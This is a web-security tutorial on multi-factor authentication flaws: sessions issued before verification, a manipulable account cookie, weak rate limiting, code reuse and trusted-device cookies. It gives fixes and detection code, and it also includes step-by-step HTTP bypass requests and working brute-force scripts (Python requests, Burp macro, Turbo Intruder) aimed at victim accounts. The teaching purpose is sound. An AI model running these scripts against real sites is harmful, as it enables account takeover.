# Vulnerabilities in multi-factor authentication

Multi-factor authentication (MFA/2FA) significantly improves security over passwords alone, but poor implementation can render it nearly useless. Common flaws include bypassable logic, brute-forceable codes, session mismanagement, and inadequate rate limiting. Even mandatory MFA can be defeated when verification isn't properly enforced or when session state is mishandled.

Understanding MFA vulnerabilities is critical because organizations often assume MFA provides complete protection, creating a false sense of security while leaving exploitable weaknesses.

> Only test systems you own or are explicitly authorized to assess.

## Understanding true multi-factor authentication

### What counts as separate factors:
- **Something you know:** Password, PIN, security answer
- **Something you have:** Phone, hardware token, authenticator app, smart card
- **Something you are:** Biometric (fingerprint, face ID, retina scan)

### Not true MFA (verifying same factor twice):
- **Email-based 2FA:** Relies on email password (both "something you know")
- **Security questions + password:** Both knowledge factors
- **Password + backup password:** Same factor verified twice

### MFA token types (security varies):

#### High security:
- **Hardware tokens:** YubiKey, RSA SecurID (purpose-built security devices)
- **TOTP authenticator apps:** Google Authenticator, Authy, Microsoft Authenticator (generates codes locally)

#### Medium security:
- **Push notifications:** Duo, Microsoft Authenticator (vulnerable to push fatigue attacks)
- **SMS codes:** Vulnerable to SIM swapping, SMS interception

#### Low security (avoid):
- **Email codes:** Only as secure as email account
- **Voice calls:** Vulnerable to call forwarding, voicemail access

## Vulnerability 1: Complete 2FA bypass (skipping verification)

### The flaw: Session created before MFA verification

Vulnerable authentication flow:
```
1. User enters username + password → Valid credentials
2. Session created: Set-Cookie: session=abc123
3. User redirected to /verify-2fa
4. User enters 2FA code
5. User redirected to /account
```

**Problem:** Session is valid after step 2, before MFA verification.

### Exploitation technique:

**Step 1:** Login normally with your own account:
```http
POST /login HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

username=attacker&password=mypassword
```

**Response:**
```http
HTTP/1.1 302 Found
Location: /verify-2fa
Set-Cookie: session=abc123xyz
```

**Step 2:** Note that you're redirected to `/verify-2fa` but already have a session cookie.

**Step 3:** Instead of completing 2FA, directly access protected pages:
```http
GET /account HTTP/1.1
Host: vulnerable-site.com
Cookie: session=abc123xyz
```

If page loads without 2FA → complete bypass.

### Attack against victim account:

**Step 1:** Use victim's stolen/phished credentials:
```http
POST /login HTTP/1.1

username=victim&password=stolen_password
```

**Response:**
```http
HTTP/1.1 302 Found
Location: /verify-2fa
Set-Cookie: session=victim_session_token
```

**Step 2:** Skip 2FA page, go directly to account:
```http
GET /account HTTP/1.1
Cookie: session=victim_session_token
```

**Step 3:** If successful, you're logged into victim's account without their 2FA code.

### Why this happens:

Vulnerable code:
```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    user = authenticate(username, password)
    if user:
        # BUG: Session created before MFA verification
        session['user_id'] = user.id
        session['logged_in'] = True  # Already logged in!
        
        if user.has_2fa:
            return redirect('/verify-2fa')
        else:
            return redirect('/account')
    
    return error("Invalid credentials")

@app.route('/account')
def account():
    # BUG: Only checks if logged in, not if 2FA was completed
    if not session.get('logged_in'):
        return redirect('/login')
    
    user = get_user(session['user_id'])
    return render_template('account.html', user=user)
```

### Secure implementation:

```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    user = authenticate(username, password)
    if user:
        if user.has_2fa:
            # Create PENDING session (not fully authenticated)
            session['pending_user_id'] = user.id
            session['auth_stage'] = 'awaiting_2fa'
            return redirect('/verify-2fa')
        else:
            # No 2FA, fully authenticate
            create_authenticated_session(user)
            return redirect('/account')
    
    return error("Invalid credentials")

@app.route('/verify-2fa', methods=['POST'])
def verify_2fa():
    # Verify we're in correct stage
    if session.get('auth_stage') != 'awaiting_2fa':
        return redirect('/login')
    
    user_id = session.get('pending_user_id')
    code = request.form['code']
    
    if verify_2fa_code(user_id, code):
        user = get_user(user_id)
        
        # Clear pending session
        session.pop('pending_user_id')
        session.pop('auth_stage')
        
        # NOW create authenticated session
        create_authenticated_session(user)
        return redirect('/account')
    
    return error("Invalid code")

@app.route('/account')
def account():
    # Check full authentication, not just logged_in flag
    if not session.get('fully_authenticated'):
        return redirect('/login')
    
    # Check auth stage isn't pending
    if session.get('auth_stage') == 'awaiting_2fa':
        return redirect('/verify-2fa')
    
    user = get_user(session['user_id'])
    return render_template('account.html', user=user)

def create_authenticated_session(user):
    session['user_id'] = user.id
    session['fully_authenticated'] = True
    session['auth_time'] = time.time()
```

## Vulnerability 2: Flawed 2FA verification logic (account parameter manipulation)

### The flaw: User identity determined by client-controlled parameter

Vulnerable flow:
```http
POST /login-step1 HTTP/1.1

username=attacker&password=mypassword
```

Response:
```http
HTTP/1.1 200 OK
Set-Cookie: account=attacker

Redirecting to 2FA verification...
```

2FA verification request:
```http
POST /login-step2 HTTP/1.1
Cookie: account=attacker

verification-code=123456
```

**Problem:** The `account` cookie determines which user to authenticate, not the actual login credentials.

### Exploitation:

**Step 1:** Login with YOUR credentials to trigger 2FA:
```http
POST /login-step1 HTTP/1.1

username=attacker&password=mypassword
```

**Step 2:** Server sets your account cookie:
```http
Set-Cookie: account=attacker
```

**Step 3:** Access 2FA verification page:
```http
GET /login-step2 HTTP/1.1
Cookie: account=attacker
```

**Step 4:** CHANGE the account cookie to victim's username:
```http
POST /login-step2 HTTP/1.1
Cookie: account=victim

verification-code=??????
```

**Step 5:** Brute-force the 6-digit code (000000-999999).

**Result:** You authenticate as the victim without knowing their password!

### Why this is devastating:

You only need:
- Victim's username (often public or enumerable)
- Ability to brute-force 6-digit code (1 million possibilities)
- No need for victim's password

### Automation script (pseudocode):

```python
import requests

def exploit_flawed_2fa(target_url, victim_username, attacker_username, attacker_password):
    # Step 1: Login with attacker credentials to initiate session
    r = requests.post(f"{target_url}/login-step1", 
                      data={"username": attacker_username, 
                            "password": attacker_password})
    
    session_cookie = r.cookies.get('session')
    
    # Step 2: Brute-force victim's 2FA code
    for code in range(1000000):  # 000000 to 999999
        code_str = str(code).zfill(6)
        
        r = requests.post(
            f"{target_url}/login-step2",
            cookies={
                'session': session_cookie,
                'account': victim_username  # Changed to victim
            },
            data={'verification-code': code_str}
        )
        
        if "Invalid code" not in r.text:
            print(f"[+] Success! Code is: {code_str}")
            return r.cookies
        
        if code % 1000 == 0:
            print(f"[*] Tried {code}/1000000...")
    
    print("[-] Failed to crack 2FA code")
```

### Real-world example flow:

```http
# Attacker logs in with own credentials
POST /login HTTP/1.1
username=attacker&password=attacker123

# Response
HTTP/1.1 200 OK
Set-Cookie: account=attacker
Set-Cookie: session=abc123

# Attacker modifies cookie and brute-forces victim's code
POST /verify-2fa HTTP/1.1
Cookie: account=administrator; session=abc123
verification-code=000000

# Try all codes 000001, 000002... until success
POST /verify-2fa HTTP/1.1
Cookie: account=administrator; session=abc123
verification-code=482951

# Response
HTTP/1.1 302 Found
Location: /my-account
Set-Cookie: session=admin_authenticated_token

# Attacker is now authenticated as administrator
```

## Vulnerability 3: Brute-forceable 2FA codes (inadequate rate limiting)

### The problem: 2FA codes are short and predictable

Typical 2FA code characteristics:
- **6 digits:** 1,000,000 possible combinations (000000-999999)
- **4 digits:** 10,000 possible combinations
- **Valid for:** 30-60 seconds (TOTP) or until used (SMS)

Without rate limiting, brute-forcing is trivial.

### Naive protection (easily bypassed):

```python
@app.route('/verify-2fa', methods=['POST'])
def verify_2fa():
    code = request.form['code']
    
    if not verify_code(session['user_id'], code):
        session['failed_attempts'] = session.get('failed_attempts', 0) + 1
        
        if session['failed_attempts'] >= 3:
            # Log user out
            session.clear()
            return error("Too many failed attempts")
        
        return error("Invalid code")
    
    # Success
    return redirect('/account')
```

**Problem:** Attacker can automate login + 3 attempts repeatedly:

```python
def bypass_2fa_with_macro():
    for code in range(0, 1000000, 3):  # Test 3 codes per session
        # Fresh login
        session = login(username, password)
        
        # Try 3 codes before logout
        for i in range(3):
            test_code = str(code + i).zfill(6)
            result = verify_2fa(session, test_code)
            
            if result.success:
                print(f"[+] Cracked code: {test_code}")
                return
        
        # Session cleared, but we just login again
```

### Better but still vulnerable: IP-based rate limiting

```python
# Track attempts per IP
ip_attempts = {}

@app.route('/verify-2fa', methods=['POST'])
def verify_2fa():
    ip = request.remote_addr
    
    if ip_attempts.get(ip, 0) >= 10:
        return error("Too many attempts from this IP")
    
    code = request.form['code']
    
    if not verify_code(session['user_id'], code):
        ip_attempts[ip] = ip_attempts.get(ip, 0) + 1
        return error("Invalid code")
    
    return redirect('/account')
```

**Bypass:** Distributed attack from multiple IPs (botnet, cloud IPs, Tor).

### Exploitation with Burp Intruder + Macros:

**Step 1:** Configure Burp macro to re-login before each attempt:
```
Macro steps:
1. POST /login (username=victim&password=stolen)
2. GET /verify-2fa
3. POST /verify-2fa (code=§CODE§)
```

**Step 2:** Set payload type to "Numbers" (0-999999, zero-padded to 6 digits).

**Step 3:** Configure macro to run before each request (bypasses logout after 3 attempts).

**Step 4:** Start attack. Intruder will:
- Login
- Try code
- Get logged out
- Login again
- Try next code
- Repeat until success

### Exploitation with Turbo Intruder (faster):

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=10,
                          requestsPerConnection=100,
                          pipeline=False)
    
    for code in range(1000000):
        code_str = str(code).zfill(6)
        
        # Login request
        login_req = '''POST /login HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded

username=victim&password=stolen'''
        
        engine.queue(login_req)
        
        # 2FA verification
        verify_req = '''POST /verify-2fa HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded

code=%s''' % code_str
        
        engine.queue(verify_req)

def handleResponse(req, interesting):
    if "Welcome" in req.response:
        print(f"[+] Success: {req.response}")
```

## Additional MFA vulnerabilities

### 4) Code reuse (codes not invalidated after use):

```python
# VULNERABLE: Code can be used multiple times
def verify_2fa(user_id, code):
    totp = pyotp.TOTP(user.secret)
    return totp.verify(code)  # No check if code already used
```

**Exploit:** If you intercept/observe a valid code, you can reuse it within the validity window (30-60 seconds).

**Fix:**
```python
# Track recently used codes
used_codes = {}

def verify_2fa(user_id, code):
    # Check if code was already used
    if (user_id, code) in used_codes:
        return False
    
    totp = pyotp.TOTP(user.secret)
    if totp.verify(code, valid_window=1):
        # Mark code as used
        used_codes[(user_id, code)] = time.time()
        
        # Clean up old entries
        cleanup_old_codes()
        
        return True
    
    return False
```

### 5) Response manipulation (trusting client-side verification):

Vulnerable JavaScript:
```javascript
// Client-side verification (INSECURE)
function verify2FA() {
    let code = document.getElementById('code').value;
    let correctCode = document.getElementById('hidden-code').value;
    
    if (code === correctCode) {
        window.location = '/account';
    }
}
```

**Exploit:** View page source, extract correct code from hidden field, or manipulate JavaScript to skip check.

### 6) Backup codes with no rate limiting:

```python
# VULNERABLE: Backup codes can be brute-forced
def verify_backup_code(user_id, code):
    user = get_user(user_id)
    return code in user.backup_codes  # No rate limiting
```

If backup codes are 8-digit numbers, that's only 100 million combinations—brute-forceable.

**Fix:** Apply same rate limiting to backup codes as primary 2FA.

### 7) Remember device without proper verification:

```python
# VULNERABLE: Device fingerprint trusted without verification
@app.route('/login')
def login():
    device_id = request.cookies.get('device_id')
    
    if device_id in user.trusted_devices:
        # Skip 2FA entirely
        return redirect('/account')
```

**Exploit:** Steal/forge device cookie to bypass 2FA.

## Prevention strategies (securing MFA)

### 1) Proper authentication state management:

```python
# Use distinct states
AUTH_STATES = {
    'UNAUTHENTICATED': 0,
    'PASSWORD_VERIFIED': 1,
    'MFA_VERIFIED': 2,
    'FULLY_AUTHENTICATED': 3
}

@app.route('/account')
def account():
    if session.get('auth_state') != AUTH_STATES['FULLY_AUTHENTICATED']:
        return redirect('/login')
    # ...
```

### 2) Rate limiting (multiple layers):

```python
def verify_2fa_with_rate_limiting(user_id, code):
    # Per-user rate limit (3 attempts, then 5 min lockout)
    if get_failed_attempts(user_id) >= 3:
        if not is_lockout_expired(user_id):
            return False, "Account temporarily locked"
    
    # Per-IP rate limit (20 attempts per hour)
    if get_ip_attempts(request.remote_addr) >= 20:
        return False, "Too many attempts from this IP"
    
    # Global rate limit (prevent distributed attacks)
    if get_global_rate() > 1000:  # 1000 attempts/sec globally
        time.sleep(1)  # Throttle
    
    # Verify code
    if verify_code(user_id, code):
        reset_failed_attempts(user_id)
        return True, None
    else:
        increment_failed_attempts(user_id)
        increment_ip_attempts(request.remote_addr)
        return False, "Invalid code"
```

### 3) Longer/more complex codes:

```python
# Use 8-10 digit codes or alphanumeric
def generate_secure_code():
    return secrets.token_urlsafe(8)  # e.g., "aK9mP2xR"
```

### 4) Time-limited codes (short validity):

```python
# TOTP codes valid for 30 seconds only
totp = pyotp.TOTP(secret, interval=30)
```

### 5) Mandatory device enrollment:

```python
def enforce_2fa():
    user = get_current_user()
    if not user.has_2fa_enabled:
        return redirect('/setup-2fa')
```

### 6) Monitor for suspicious patterns:

```python
def detect_2fa_attack(user_id):
    recent_failures = get_recent_failures(user_id, minutes=5)
    
    if recent_failures > 5:
        alert_security_team(f"Possible 2FA brute-force on {user_id}")
        lock_account(user_id)
        notify_user(user_id, "Suspicious 2FA attempts detected")
```
